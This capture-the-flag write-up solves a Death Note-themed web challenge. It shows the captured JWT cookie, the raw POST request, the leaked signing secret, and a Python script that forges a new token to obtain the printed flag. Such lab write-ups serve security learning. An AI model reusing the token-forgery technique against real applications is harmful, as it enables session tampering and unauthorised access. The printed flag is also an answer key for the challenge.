# Chapter 5: The Final Stand (500 points / 2 solves)

The final piece of the puzzle leads L to a Website, a digital stronghold created by Kira. The site is rigged, designed to eliminate anyone who dares to stop Kira. However, L has uncovered a flaw, a way to turn Kira's creation against him and bring an end to his reign.

Check out the Website here:

http://chall.ycfteam.in:8370/

## Overview

Okay finally, the last challenge. And of course it had to be web :sob:

## Solve

Opening up the website and clicking the kill button, we can see a jwt cookie - `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWxsZXIiOiJLaXJhIiwidmljdGltIjoiTCIsInN1c3BlY3QiOiJSeXVrIiwiZXhwIjoxNzI1NzM4MTE3fQ.tQXhTSh1_mb1Pnv0DCyZ9HEAq6HF7mqPpzfE4N2oG5U`

![image](https://github.com/user-attachments/assets/04d83172-fbd1-4d16-9f78-744450aa558c)

So basically according to the question, we have to kill Kira.

```
POST /kill HTTP/1.1
Host: chall.ycfteam.in:8370
Content-Length: 6
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://chall.ycfteam.in:8370
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chall.ycfteam.in:8370/
Accept-Encoding: gzip, deflate, br
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWxsZXIiOiJLaXJhIiwidmljdGltIjoiTCIsInN1c3BlY3QiOiJSeXVrIiwiZXhwIjoxNzI1NzM4MTE3fQ.tQXhTSh1_mb1Pnv0DCyZ9HEAq6HF7mqPpzfE4N2oG5U
Connection: keep-alive

kill=L
```

Now simply changing `kill` to `Kira` wont work since we have a JWT to change as well. For that, we need the secret of the JWT key and we already have that! We got it in a previous part (https://pastebin.com/u/sneckey0day --> https://pastebin.com/CZx54e7u)

So now, we have the JWT secret `shinigamictf2k24`. Now, we can just keep changing values until we get the flag and those values are:

```
{
  "killer": "Ryuk",
  "victim": "Kira",
  "suspect": "Ryuk",
  "exp": ...
}

kill=Kira
```

We can sign a new JWT using this secret:

```py
import jwt
import time

secret = "shinigamictf2k24"

payload = {
    "killer": "Ryuk",
    "victim": "Kira",
    "suspect": "Ryuk",
    "exp": int(time.time()) + 3600
}

new_jwt = jwt.encode(payload, secret, algorithm="HS256")

print("New JWT:", new_jwt)
```

And send the request with the new stuff and get the flag!

![image](https://github.com/user-attachments/assets/5c8e79ae-dd74-4859-a67d-bf5d4f70de7f)

`BsidesDehradun{K1r4_1s_n0_M0r3}`
